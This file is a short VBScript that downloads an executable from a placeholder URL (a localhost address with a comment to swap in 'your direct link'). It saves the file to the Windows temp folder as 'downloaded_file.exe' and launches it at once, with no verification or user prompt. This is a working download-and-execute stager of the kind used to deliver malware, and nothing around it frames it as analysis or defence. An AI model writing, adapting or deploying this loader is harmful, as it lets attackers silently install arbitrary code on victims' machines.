
Dim url, savePath, objHTTP, objStream, objShell

url = "http://127.0.0.1:5000/download/fT6kk8Ajvkmabapb8CW0uWBHodlTjNF0phZe_Dk0Uf4"  ' <-- Replace with your direct link
savePath = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\downloaded_file.exe"

Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objHTTP.Open "GET", url, False
objHTTP.Send

If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile savePath, 2
    objStream.Close

    Set objShell = CreateObject("WScript.Shell")
    objShell.Run Chr(34) & savePath & Chr(34), 1, False
Else
    MsgBox "HTTP error: " & objHTTP.Status
End If